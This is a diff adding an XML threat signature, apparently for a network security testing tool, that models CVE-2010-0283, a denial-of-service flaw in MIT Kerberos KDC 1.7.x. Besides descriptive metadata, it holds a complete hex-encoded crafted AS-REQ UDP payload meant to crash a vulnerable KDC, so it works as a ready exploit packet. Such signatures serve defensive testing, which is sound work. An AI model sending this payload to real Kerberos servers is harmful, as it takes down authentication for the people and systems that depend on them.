@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MIT Kerberos KDC Authentication Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability has been reported in MIT's Kerberos KDC. The vulnerability is due to an assertion failure when handling invalid Authentication Service requests. Remote unauthenticated attackers can exploit this vulnerability by sending a crafted AS-REQ packet to the target KDC, causing it to crash, creating a denial of service condition."/>
+    <Intent display="true">
+      <item value="Denial_Of_Service/Input_Validation_Error"/>
+    </Intent>
+    <Protocol display="true" value="Kerberos ASN.1"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="MIT"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MIT_Kerberos_krb5"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="MIT_Kerberos_krb5_1.7.x_prior_to_1.7.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0283"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="c0fb3cdd762fe1e866a85f0a6cc730a2"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634027986821395810"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1267180210" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00DD" Identification="DF40" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$destPort" checksum="" length="00C9" Payload="6A81BE3081BBA103020105A20302010CA481AE3081ABA00703050040000010A1193017A003020101A110300E1B0561646D696E1B0561646D696EA20D1B0B54454C555356522E434F4DA320301EA003020100A11730151B066B72627467741B0B54454C555356522E434F4DA411180F32303130303232333136343932385AA511180F32303130303232343136343932385AA70602044B840718A826302402011202011102011002011702010102010302010202010B02010A02010F02010C02010D"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
